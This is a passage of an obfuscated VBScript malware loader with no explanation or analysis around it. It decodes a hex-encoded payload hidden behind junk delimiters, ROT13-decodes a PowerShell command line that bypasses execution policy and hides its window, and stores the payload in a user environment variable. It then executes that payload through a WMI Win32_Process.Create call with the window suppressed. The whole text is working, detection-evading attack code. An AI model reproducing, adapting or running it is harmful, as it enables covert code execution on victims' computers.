⢦7␶ణ🐍⢦5␶ణ🐍⢦4␶ణ🐍⢦A␶ణ🐍⢦4␶ణ🐍⢦C␶ణ🐍⢦7␶ణ🐍⢦A␶ణ🐍⢦7␶ణ🐍⢦2␶ణ🐍⢦3␶ణ🐍⢦2␶ణ🐍⢦6␶ణ🐍⢦6␶ణ🐍⢦5␶ణ🐍⢦7␶ణ🐍⢦3␶ణ🐍⢦1␶ణ🐍⢦4␶ణ🐍⢦2␶ణ🐍⢦4␶ణ🐍⢦3␶ణ🐍⢦7␶ణ🐍⢦9␶ణ🐍⢦7␶ణ🐍⢦3␶ణ🐍⢦4␶ణ🐍⢦6␶ణ🐍⢦4␶ణ🐍⢦A␶ణ🐍⢦5␶ణ🐍⢦9␶ణ🐍⢦5␶ణ🐍⢦9␶ణ🐍⢦6␶ణ🐍⢦B␶ణ🐍⢦3␶ణ🐍⢦9␶ణ🐍⢦5␶ణ🐍⢦9␶ణ🐍⢦3␶ణ🐍⢦7␶ణ🐍⢦5␶ణ🐍⢦5␶ణ🐍⢦4␶ణ🐍⢦6␶ణ🐍⢦3␶ణ🐍⢦1␶ణ🐍⢦6␶ణ🐍⢦D␶ణ🐍⢦4␶ణ🐍⢦8␶ణ🐍⢦4␶ణ🐍⢦3␶ణ🐍⢦5␶ణ🐍⢦4␶ణ🐍⢦4␶ణ🐍⢦C␶ణ🐍⢦6␶ణ🐍⢦9␶ణ🐍⢦5␶ణ🐍⢦1␶ణ🐍⢦6␶ణ🐍⢦1␶ణ🐍⢦3␶ణ🐍⢦4␶ణ🐍⢦7␶ణ🐍⢦2␶ణ🐍⢦3␶ణ🐍⢦2␶ణ🐍⢦3␶ణ🐍⢦4␶ణ🐍⢦4␶ణ🐍⢦4␶ణ🐍⢦3␶ణ🐍⢦6␶ణ🐍⢦4␶ణ🐍⢦B␶ణ🐍⢦3␶ణ🐍⢦9␶ణ🐍⢦5␶ణ🐍⢦6␶ణ🐍⢦6␶ణ🐍⢦A␶ణ🐍⢦5␶ణ🐍⢦8␶ణ🐍⢦3␶ణ🐍⢦4␶ణ🐍⢦4␶ణ🐍⢦7␶ణ🐍⢦4␶ణ🐍⢦2␶ణ🐍⢦3␶ణ🐍⢦3␶ణ🐍⢦6␶ణ🐍⢦A␶ణ🐍⢦7␶ణ🐍⢦7␶ణ🐍⢦4␶ణ🐍⢦3␶ణ🐍⢦6␶ణ🐍⢦6␶ణ🐍⢦5␶ణ🐍⢦7␶ణ🐍⢦7␶ణ🐍⢦9␶ణ🐍⢦7␶ణ🐍⢦5␶ణ🐍⢦4␶ణ🐍⢦5␶ణ🐍⢦7␶ణ🐍⢦3␶ణ🐍⢦3␶ణ🐍⢦3␶ణ🐍⢦7␶ణ🐍⢦7␶ణ🐍⢦5␶ణ🐍⢦2␶ణ🐍⢦4␶ణ🐍⢦6␶ణ🐍⢦3␶ణ🐍⢦8␶ణ🐍⢦6␶ణ🐍⢦4␶ణ🐍⢦7␶ణ🐍⢦6␶ణ🐍⢦3␶ణ🐍⢦3␶ణ🐍⢦5␶ణ🐍⢦9␶ణ🐍⢦6␶ణ🐍⢦2␶ణ🐍⢦3␶ణ🐍⢦5␶ణ🐍⢦3␶ణ🐍⢦6␶ణ🐍⢦5␶ణ🐍⢦7␶ణ🐍⢦7␶ణ🐍⢦9␶ణ🐍⢦7␶ణ🐍⢦0␶ణ🐍⢦3␶ణ🐍⢦6␶ణ🐍⢦7␶ణ🐍⢦A␶ణ🐍⢦3␶ణ🐍⢦4␶ణ🐍⢦6␶ణ🐍⢦3␶ణ🐍⢦7␶ణ🐍⢦6␶ణ🐍⢦6␶ణ🐍⢦5␶ణ🐍⢦7␶ణ🐍⢦8␶ణ🐍⢦6␶ణ🐍⢦9␶ణ🐍⢦4␶ణ🐍⢦2␶ణ🐍⢦6␶ణ🐍⢦6␶ణ🐍⢦5␶ణ🐍⢦7␶ణ🐍⢦4␶ణ🐍⢦A␶ణ🐍⢦6␶ణ🐍⢦8␶ణ🐍⢦7␶ణ🐍⢦3␶ణ🐍⢦7␶ణ🐍⢦3␶ణ🐍⢦6␶ణ🐍⢦8␶ణ🐍⢦5␶ణ🐍⢦9␶ణ🐍⢦4␶ణ🐍⢦3␶ణ🐍⢦6␶ణ🐍⢦6␶ణ🐍⢦7␶ణ🐍⢦9␶ణ🐍⢦5␶ణ🐍⢦6␶ణ🐍⢦4␶ణ🐍⢦2␶ణ🐍⢦4␶ణ🐍⢦2␶ణ🐍⢦4␶ణ🐍⢦4␶ణ🐍⢦6␶ణ🐍⢦4␶ణ🐍⢦4␶ణ🐍⢦3␶ణ🐍⢦5␶ణ🐍⢦4␶ణ🐍⢦4␶ణ🐍⢦2␶ణ🐍⢦6␶ణ🐍⢦5␶ణ🐍⢦2␶ణ🐍⢦E␶ణ🐍⢦4␶ణ🐍⢦9␶ణ🐍⢦6␶ణ🐍⢦E␶ణ🐍⢦7␶ణ🐍⢦6␶ణ🐍⢦6␶ణ🐍⢦F␶ణ🐍⢦6␶ణ🐍⢦B␶ణ🐍⢦6␶ణ🐍⢦5␶ణ🐍⢦2␶ణ🐍⢦8␶ణ🐍⢦2␶ణ🐍⢦4␶ణ🐍⢦6␶ణ🐍⢦E␶ణ🐍⢦5␶ణ🐍⢦5␶ణ🐍⢦4␶ణ🐍⢦C␶ణ🐍⢦6␶ణ🐍⢦C␶ణ🐍⢦2␶ణ🐍⢦C␶ణ🐍⢦5␶ణ🐍⢦B␶ణ🐍⢦6␶ణ🐍⢦F␶ణ🐍⢦6␶ణ🐍⢦2␶ణ🐍⢦6␶ణ🐍⢦A␶ణ🐍⢦6␶ణ🐍⢦5␶ణ🐍⢦6␶ణ🐍⢦3␶ణ🐍⢦7␶ణ🐍⢦4␶ణ🐍⢦5␶ణ🐍⢦B␶ణ🐍⢦5␶ణ🐍⢦D␶ణ🐍⢦5␶ణ🐍⢦D␶ణ🐍⢦2␶ణ🐍⢦4␶ణ🐍⢦3␶ణ🐍⢦2␶ణ🐍⢦6␶ణ🐍⢦7␶ణ🐍⢦5␶ణ🐍⢦A␶ణ🐍⢦7␶ణ🐍⢦2␶ణ🐍⢦6␶ణ🐍⢦D␶ణ🐍⢦5␶ణ🐍⢦6␶ణ🐍⢦3␶ణ🐍⢦0␶ణ🐍⢦7␶ణ🐍⢦0␶ణ🐍⢦6␶ణ🐍⢦F␶ణ🐍⢦7␶ణ🐍⢦2␶ణ🐍⢦3␶ణ🐍⢦9␶ణ🐍⢦5␶ణ🐍⢦4␶ణ🐍⢦3␶ణ🐍⢦1␶ణ🐍⢦7␶ణ🐍⢦0␶ణ🐍⢦6␶ణ🐍⢦4␶ణ🐍⢦3␶ణ🐍⢦0␶ణ🐍⢦6␶ణ🐍⢦B␶ణ🐍⢦6␶ణ🐍⢦8␶ణ🐍⢦7␶ణ🐍⢦9␶ణ🐍⢦3␶ణ🐍⢦7␶ణ🐍⢦5␶ణ🐍⢦2␶ణ🐍⢦6␶ణ🐍⢦B␶ణ🐍⢦3␶ణ🐍⢦5␶ణ🐍⢦7␶ణ🐍⢦1␶ణ🐍⢦4␶ణ🐍⢦F␶ణ🐍⢦3␶ణ🐍⢦1␶ణ🐍⢦7␶ణ🐍⢦2␶ణ🐍⢦4␶ణ🐍⢦A␶ణ🐍⢦6␶ణ🐍⢦C␶ణ🐍⢦7␶ణ🐍⢦2␶ణ🐍⢦7␶ణ🐍⢦8␶ణ🐍⢦6␶ణ🐍⢦5␶ణ🐍⢦4␶ణ🐍⢦2␶ణ🐍⢦5␶ణ🐍⢦8␶ణ🐍⢦6␶ణ🐍⢦2␶ణ🐍⢦6␶ణ🐍⢦A␶ణ🐍⢦6␶ణ🐍⢦C␶ణ🐍⢦7␶ణ🐍⢦8␶ణ🐍⢦3␶ణ🐍⢦8␶ణ🐍⢦5␶ణ🐍⢦5␶ణ🐍⢦7␶ణ🐍⢦A␶ణ🐍⢦3␶ణ🐍⢦4␶ణ🐍⢦3␶ణ🐍⢦9␶ణ🐍⢦6␶ణ🐍⢦B␶ణ🐍⢦5␶ణ🐍⢦7␶ణ🐍⢦4␶ణ🐍⢦7␶ణ🐍⢦7␶ణ🐍⢦2␶ణ🐍⢦4␶ణ🐍⢦1␶ణ🐍⢦4␶ణ🐍⢦3␶ణ🐍⢦6␶ణ🐍⢦D␶ణ🐍⢦4␶ణ🐍⢦1␶ణ🐍⢦4␶ణ🐍⢦A␶ణ🐍⢦4␶ణ🐍⢦5␶ణ🐍⢦6␶ణ🐍⢦1␶ణ🐍⢦5␶ణ🐍⢦9␶ణ🐍⢦3␶ణ🐍⢦5␶ణ🐍⢦5␶ణ🐍⢦3␶ణ🐍⢦7␶ణ🐍⢦5␶ణ🐍⢦6␶ణ🐍⢦C␶ణ🐍⢦7␶ణ🐍⢦8␶ణ🐍⢦4␶ణ🐍⢦6␶ణ🐍⢦5␶ణ🐍⢦6␶ణ🐍⢦6␶ణ🐍⢦6␶ణ🐍⢦3␶ణ🐍⢦4␶ణ🐍⢦3␶ణ🐍⢦7␶ణ🐍⢦5␶ణ🐍⢦5␶ణ🐍⢦6␶ణ🐍⢦D␶ణ🐍⢦4␶ణ🐍⢦B␶ణ🐍⢦6␶ణ🐍⢦4␶ణ🐍⢦4␶ణ🐍⢦8␶ణ🐍⢦6␶ణ🐍⢦8␶ణ🐍⢦6␶ణ🐍⢦4␶ణ🐍⢦4␶ణ🐍⢦B␶ణ🐍⢦3␶ణ🐍⢦6␶ణ🐍⢦6␶ణ🐍⢦4␶ణ🐍⢦6␶ణ🐍⢦2␶ణ🐍⢦5␶ణ🐍⢦0␶ణ🐍⢦7␶ణ🐍⢦8␶ణ🐍⢦4␶ణ🐍⢦7␶ణ🐍⢦4␶ణ🐍⢦F␶ణ🐍⢦5␶ణ🐍⢦9␶ణ🐍⢦3␶ణ🐍⢦4␶ణ🐍⢦7␶ణ🐍⢦7␶ణ🐍⢦5␶ణ🐍⢦9␶ణ🐍⢦7␶ణ🐍⢦A␶ణ🐍⢦6␶ణ🐍⢦D␶ణ🐍⢦5␶ణ🐍⢦9␶ణ🐍⢦3␶ణ🐍⢦2␶ణ🐍⢦6␶ణ🐍⢦7␶ణ🐍⢦6␶ణ🐍⢦F␶ణ🐍⢦5␶ణ🐍⢦9␶ణ🐍⢦7␶ణ🐍⢦8␶ణ🐍⢦5␶ణ🐍⢦9␶ణ🐍⢦4␶ణ🐍⢦E␶ణ🐍⢦3␶ణ🐍⢦1␶ణ🐍⢦4␶ణ🐍⢦6␶ణ🐍⢦3␶ణ🐍⢦0␶ణ🐍⢦5␶ణ🐍⢦5␶ణ🐍⢦7␶ణ🐍⢦0␶ణ🐍⢦6␶ణ🐍⢦1␶ణ🐍⢦4␶ణ🐍⢦5␶ణ🐍⢦6␶ణ🐍⢦D␶ణ🐍⢦3␶ణ🐍⢦3␶ణ🐍⢦5␶ణ🐍⢦3␶ణ🐍⢦6␶ణ🐍⢦E␶ణ🐍⢦7␶ణ🐍⢦1␶ణ🐍⢦4␶ణ🐍⢦A␶ణ🐍⢦4␶ణ🐍⢦8␶ణ🐍⢦4␶ణ🐍⢦1␶ణ🐍⢦6␶ణ🐍⢦6␶ణ🐍⢦5␶ణ🐍⢦0␶ణ🐍⢦7␶ణ🐍⢦4␶ణ🐍⢦7␶ణ🐍⢦3␶ణ🐍⢦6␶ణ🐍⢦D␶ణ🐍⢦7␶ణ🐍⢦4␶ణ🐍⢦3␶ణ🐍⢦4␶ణ🐍⢦6␶ణ🐍⢦D␶ణ🐍⢦4␶ణ🐍⢦4␶ణ🐍⢦6␶ణ🐍⢦2␶ణ🐍⢦6␶ణ🐍⢦6␶ణ🐍⢦6␶ణ🐍⢦C␶ణ🐍⢦6␶ణ🐍⢦7␶ణ🐍⢦6␶ణ🐍⢦1␶ణ🐍⢦7␶ణ🐍⢦7␶ణ🐍⢦4␶ణ🐍⢦9␶ణ🐍⢦4␶ణ🐍⢦A␶ణ🐍⢦6␶ణ🐍⢦E␶ణ🐍⢦6␶ణ🐍⢦F␶ణ🐍⢦4␶ణ🐍⢦6␶ణ🐍⢦5␶ణ🐍⢦1␶ణ🐍⢦6␶ణ🐍⢦C␶ణ🐍⢦6␶ణ🐍⢦8␶ణ🐍⢦4␶ణ🐍⢦2␶ణ🐍⢦4␶ణ🐍⢦9␶ణ🐍⢦6␶ణ🐍⢦3␶ణ🐍⢦4␶ణ🐍⢦7␶ణ🐍⢦3␶ణ🐍⢦4␶ణ🐍⢦4␶ణ🐍⢦2␶ణ🐍⢦5␶ణ🐍⢦3␶ణ🐍⢦4␶ణ🐍⢦E␶ణ🐍⢦5␶ణ🐍⢦6␶ణ🐍⢦2␶ణ🐍⢦9␶ణ🐍⢦7␶ణ🐍⢦D␶ణ🐍⢦0␶ణ🐍⢦D␶ణ🐍⢦0␶ణ🐍⢦A␶ణ🐍⢦0␶ణ🐍⢦D␶ణ🐍⢦0␶ణ🐍⢦A␶ణ🐍⢦6␶ణ🐍⢦3␶ణ🐍⢦6␶ణ🐍⢦1␶ణ🐍⢦7␶ణ🐍⢦4␶ణ🐍⢦6␶ణ🐍⢦3␶ణ🐍⢦6␶ణ🐍⢦8␶ణ🐍⢦7␶ణ🐍⢦B␶ణ🐍⢦0␶ణ🐍⢦D␶ణ🐍⢦0␶ణ🐍⢦A␶ణ🐍⢦0␶ణ🐍⢦D␶ణ🐍⢦0␶ణ🐍⢦A␶ణ🐍⢦0␶ణ🐍⢦D␶ణ🐍⢦0␶ణ🐍⢦A␶ణ🐍⢦0␶ణ🐍⢦D␶ణ🐍⢦0␶ణ🐍⢦A␶ణ🐍⢦7␶ణ🐍⢦D␶ణ🐍⢦0␶ణ🐍⢦D␶ణ🐍⢦0␶ణ🐍⢦A␶ణ🐍⢦0␶ణ🐍⢦D␶ణ🐍⢦0␶ణ🐍⢦A␶ణ🐍⢦"
atropisomerism = ""
duellist = Split(CStr(greenfinches), "␶ణ🐍⢦")
For otidiform = 0 To UBound(duellist)
    atropisomerism = atropisomerism & duellist(otidiform)
Next

atropisomerism = Trim(atropisomerism)
ultramodernist = Chr(38) & Chr(72) 
wattshode = ""

For dicoumarol = 1 To Len(atropisomerism) Step 2
    wattshode = wattshode & Chr(CInt(ultramodernist & Mid(atropisomerism, dicoumarol, 2)))
Next

Dim dream, fooled, fuddling, vergency, haemantamines, martiology
Dim hardspun, pointclass, soffits, orthogonality

dream = Array( _
    "VAGREANY_QO_PNPUR", _
    "cbjrefuryy.rkr -RkrphgvbaCbyvpl Olcnff -AbCebsvyr -JvaqbjFglyr Uvqqra -Pbzznaq", _
    "VRK $rai:", _
    ";[Raivebazrag]::FrgRaivebazragInevnoyr" _
)

For martiology = 0 To UBound(dream)
    fooled = dream(martiology)
    fuddling = ""
    For haemantamines = 1 To Len(fooled)
        vergency = Asc(Mid(fooled, haemantamines, 1))
        If (vergency >= 65 And vergency <= 77) Or (vergency >= 97 And vergency <= 109) Then
            fuddling = fuddling & Chr(vergency + 13)
        ElseIf (vergency >= 78 And vergency <= 90) Or (vergency >= 110 And vergency <= 122) Then
            fuddling = fuddling & Chr(vergency - 13)
        Else
            fuddling = fuddling & Mid(fooled, haemantamines, 1)
        End If
    Next
    dream(martiology) = fuddling
Next

hardspun    = dream(0)
pointclass     = dream(1)
soffits     = dream(2)
orthogonality     = dream(3)

Dim pithos, ahhed, inanitiate, platycephalus, repaidS, repaidSt, repaidP, plumulites

Set pithos = CreateObject("WScript.Shell")
Set ahhed = pithos.Environment("User")
ahhed(hardspun) = wattshode

inanitiate = Chr(38) & " ([ScZripZtBZloZck]::CZrZeate(${env:" & hardspun & "}))"
inanitiate = Replace(inanitiate, "Z", "")
platycephalus = pointclass & " """ & inanitiate & """"

plumulites = Array("77696e6d676d74733a726f6f745c63696d7632", "57696e33325f50726f6365737353746172747570", "57696e33325f50726f63657373")

For martiology = 0 To UBound(plumulites)
    atropisomerism = plumulites(martiology)
    fuddling = ""
    For dicoumarol = 1 To Len(atropisomerism) Step 2
        fuddling = fuddling & Chr(CInt(ultramodernist & Mid(atropisomerism, dicoumarol, 2)))
    Next
    plumulites(martiology) = fuddling
Next

repaidS  = plumulites(0)
repaidSt = plumulites(1)
repaidP  = plumulites(2)

Dim exenterated, phoronomia, palaeoflora, scurried

Set exenterated = GetObject(repaidS)
Set phoronomia = exenterated.Get(repaidSt).SpawnInstance_

phoronomia.ShowWindow = 0 

palaeoflora = exenterated.Get(repaidP).Create(platycephalus, Null, phoronomia, scurried)

Set ahhed = Nothing
Set pithos = Nothing
Set exenterated = Nothing
Set phoronomia = Nothing
